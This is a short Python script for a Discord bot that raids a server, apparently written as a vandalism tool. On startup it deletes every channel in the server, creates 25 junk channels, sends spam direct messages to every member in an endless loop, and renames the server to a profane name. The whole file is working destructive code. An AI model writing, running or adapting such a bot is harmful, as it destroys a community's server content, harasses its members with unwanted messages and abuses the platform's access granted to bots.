import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    guild = bot.guilds[0]  # Assumes the bot is only in one server

    # Deleting existing channels
    for channel in guild.channels:
        await channel.delete()

    # Creating bot-generated channels
    for i in range(25):
        await guild.create_text_channel(f'bot-generated-channel-{i+1}')

    # Spaming users in private messages
    while True:
        for member in guild.members:
            try:
                await member.send('Prepare to be spammed by the bot!')
            except:
                pass

        # Renaming the server
        await guild.edit(name='fucked-by-the-Plaidtechs')

bot.run('YOUR_BOT_TOKEN')